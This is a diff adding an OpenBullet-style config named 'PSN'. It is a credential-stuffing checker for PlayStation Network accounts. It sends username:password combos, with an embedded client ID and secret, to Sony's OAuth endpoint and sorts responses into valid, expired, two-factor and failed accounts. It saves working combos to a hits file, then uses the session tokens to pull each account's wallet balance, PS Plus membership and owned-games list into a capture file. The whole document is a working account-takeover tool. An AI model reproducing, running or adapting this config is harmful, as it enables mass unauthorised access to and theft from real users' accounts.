@@ -1,0 +1,238 @@
+[SETTINGS]
+{
+  "Name": "PSN",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-17T03:21:16.1248078-05:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "FFaez1267",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#API REQUEST POST "https://auth.api.np.ac.playstation.net/2.0/oauth/token" 
+  CONTENT "grant_type=password&client_id=076e6730-dd6e-4b6e-ac6e-fb52da665108&client_secret=hV7D5T0iLkPcIPFJ&scope=openid&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: NpOAuthVsh/4.86" 
+
+#Key_check KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid login" 
+    KEY "Mandatory parameter" 
+    KEY "Account not linked to PSN" 
+    KEY "ToSUA must be re-accepted" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "Password expired" 
+    KEY "Password credentials are locked" 
+    KEY "Banned account" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "403" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "Missing device identifier for two step account" 
+
+UTILITY File "Hits\\PSN\\PlainHits.txt" AppendLines "<USER>:<PASS>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "Access Denied" 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "TOKEN" 
+
+REQUEST POST "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorizeCheck" 
+  CONTENT "{\"npsso\":\"<COOKIES(npsso)>\",\"client_id\":\"fe1fdbfa-f1a1-47ac-b793-e648fba25e86\",\"scope\":\"psn:s2s\",\"service_entity\":\"urn:service-entity:psn\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "Host: auth.api.sonyentertainmentnetwork.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 187" 
+  HEADER "X-Referer-Info: https://id.sonyentertainmentnetwork.com/signin/?client_id=fe1fdbfa-f1a1-47ac-b793-e648fba25e86&redirect_uri=https://secure.eu.playstation.com/psnauth/PSNOAUTHResponse/pdc/&service_entity=urn:service-entity:psn&response_type=code&ui=pr&service_logo=ps&request_locale=en_GB&error=login_required&error_code=4165&error_description=User+is+not+authenticated&no_captcha=false" 
+  HEADER "Origin: https://id.sonyentertainmentnetwork.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "Access Denied" 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+REQUEST GET "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&prompt=none&client_id=d932d31d-e8fc-4058-bd22-16d474938353&scope=kamaji%3Aget_vu_mylibrary%2Ckamaji%3Aget_recs%2Ckamaji%3Aget_internal_entitlements%2Cgenome%3Agene_get%2Cwallets%3Ainstrument.get&redirect_uri=https%3A%2F%2Fstore.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3D55be9ffb-6764-4ab1-aaa6-2b94e5a0c16e" AutoRedirect=FALSE 
+  
+  HEADER "Host: auth.api.sonyentertainmentnetwork.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Referer: https://store.playstation.com/en-us/home/STORE-MSF77008-MOBWELOMGAMEONLY?smcid=pdc%3Agb-en%3Aweb-pdc-sign-in-and-connect" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "Access Denied" 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+PARSE "<HEADERS(Location)>" LR "https://store.playstation.com/html/webIframeRedirect.html?requestId=" "#" -> VAR "req" 
+
+REQUEST GET "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=code&prompt=none&client_id=f6c7057b-f688-4744-91c0-8179592371d2&scope=kamaji:commerce_native,kamaji:commerce_container,kamaji:lists&redirect_uri=https://store.playstation.com/html/webIframeRedirect.html?requestId=<req>" AutoRedirect=FALSE ReadResponseSource=FALSE 
+  
+  HEADER "Host: auth.api.sonyentertainmentnetwork.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Referer: https://store.playstation.com/en-us/home/STORE-MSF77008-MOBWELOMGAMEONLY?smcid=pdc%3Agb-en%3Aweb-pdc-sign-in-and-connect" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "Access Denied" 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+PARSE "<HEADERS(X-NP-GRANT-CODE)>" LR "" "" -> VAR "CODE" 
+
+REQUEST POST "https://store.playstation.com/kamaji/api/valkyrie_storefront/00_09_000/user/session" ReadResponseSource=FALSE 
+  CONTENT "code=<CODE>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: store.playstation.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 11" 
+  HEADER "Kamaji-Client: valkyrie_storefront-mobile" 
+  HEADER "Origin: https://store.playstation.com" 
+  HEADER "X-Alt-Referer: https://store.playstation.com/html/webIframeRedirect.html?requestId=<req>" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://store.playstation.com/en-us/home/STORE-MSF77008-MOBWELOMGAMEONLY?smcid=pdc%3Agb-en%3Aweb-pdc-sign-in-and-connect" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "Access Denied" 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+REQUEST GET "https://store.playstation.com/kamaji/api/valkyrie_storefront/00_09_000/user/checkout/cart" 
+  
+  HEADER "Host: store.playstation.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://store.playstation.com/en-us/download/list" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "Access Denied" 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+PARSE "<SOURCE>" JSON "wallet_balance" CreateEmpty=FALSE -> CAP "Wallet Balance" 
+
+REQUEST GET "https://store.playstation.com/kamaji/api/valkyrie_storefront/00_09_000/gateway/store/v1/users/me/psnsubscriptions" 
+  
+  HEADER "Host: store.playstation.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://store.playstation.com/en-us/home/STORE-MSF77008-MOBWELOMGAMEONLY?smcid=pdc%3Agb-en%3Aweb-pdc-sign-in-and-connect" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "Access Denied" 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+PARSE "<SOURCE>" JSON "member_type" CreateEmpty=FALSE -> CAP "PSN Plus Type" 
+
+REQUEST GET "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&prompt=none&client_id=d932d31d-e8fc-4058-bd22-16d474938353&scope=kamaji:get_vu_mylibrary,kamaji:get_recs,kamaji:get_internal_entitlements,genome:gene_get,wallets:instrument.get&redirect_uri=https://store.playstation.com/html/webIframeRedirect.html?requestId=<req>" AutoRedirect=FALSE 
+  
+  HEADER "Host: auth.api.sonyentertainmentnetwork.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Referer: https://store.playstation.com/en-us/home/STORE-MSF77008-MOBWELOMGAMEONLY?smcid=pdc%3Agb-en%3Aweb-pdc-sign-in-and-connect" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "Access Denied" 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+PARSE "<HEADERS(Location)>" LR "access_token=" "&" -> VAR "access_token" 
+
+REQUEST GET "https://commerce.api.np.km.playstation.net/commerce/api/v1/users/me/internal_entitlements?meta_rev=0&revision=0&start=0&size=450&fields=meta_rev%2Ccloud_meta%2Creward_meta%2Cgame_meta%2Cdrm_def%2Cdrm_def.content_type" 
+  
+  HEADER "Host: commerce.api.np.km.playstation.net" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Authorization: Bearer <access_token>" 
+  HEADER "Origin: https://store.playstation.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://store.playstation.com/en-us/home/STORE-MSF77008-MOBWELOMGAMEONLY?smcid=pdc%3Agb-en%3Aweb-pdc-sign-in-and-connect" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "Access Denied" 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+PARSE "<SOURCE>" LR "\",\"name\":\"" "\",\"package" Recursive=TRUE CreateEmpty=FALSE -> VAR "Games" 
+
+FUNCTION CountOccurrences "\",\"name\":\"" "<SOURCE>" -> CAP "Games Count" 
+
+FUNCTION Constant "1" -> VAR "xD" 
+
+UTILITY File "Hits\\PSN\\Capture.txt" AppendLines "=========================================" 
+
+UTILITY File "Hits\\PSN\\Capture.txt" AppendLines "Combo: <USER>:<PASS>" 
+
+UTILITY File "Hits\\PSN\\Capture.txt" AppendLines "Wallet Balance: <Wallet Balance>" 
+
+UTILITY File "Hits\\PSN\\Capture.txt" AppendLines "PSN Plus Type: <PSN Plus Type>" 
+
+UTILITY File "Hits\\PSN\\Capture.txt" AppendLines "=========================================" 
+
+UTILITY File "Hits\\PSN\\Capture.txt" AppendLines "<Games[*]>" 
+
+UTILITY File "Hits\\PSN\\Capture.txt" AppendLines "=========================================" 
+
